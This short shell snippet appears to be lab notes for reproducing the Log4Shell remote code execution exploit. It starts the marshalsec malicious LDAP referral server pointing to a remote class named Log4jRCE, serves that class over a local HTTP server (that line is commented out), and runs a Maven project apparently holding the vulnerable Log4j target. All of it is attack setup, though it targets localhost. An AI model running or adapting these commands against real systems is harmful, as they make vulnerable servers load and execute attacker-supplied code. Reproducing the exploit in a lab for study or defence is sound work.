java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
#python3 -m http.server 8888
mvn exec:java -Dexec.mainClass="log4j"
